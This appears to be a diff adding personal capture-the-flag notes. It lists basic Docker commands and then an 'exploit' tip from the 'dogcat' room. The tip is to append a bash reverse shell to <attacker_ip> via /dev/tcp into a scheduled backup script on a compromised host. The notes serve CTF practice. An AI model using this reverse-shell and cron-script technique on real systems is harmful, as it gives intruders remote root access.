@@ -1,0 +1,31 @@
+===========
+download os
+===========
+sudo docker pull <os>
+
+=============
+run container
+=============
+sudo docker run -d -t --name <container name> <os>
+
+===================
+list the containers
+===================
+sudo docker ps
+
+===================
+enter the container
+===================
+sudo docker exec -it <container name> <shell type>
+
+=======
+exploit
+=======
+If the exploited system is on docker container and the owner run some script regularly, find the script and edit
+
+	example
+	ROOM : dogcat
+	/opt/backups/backup.sh
+
+	#!/bin/bash
+	/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
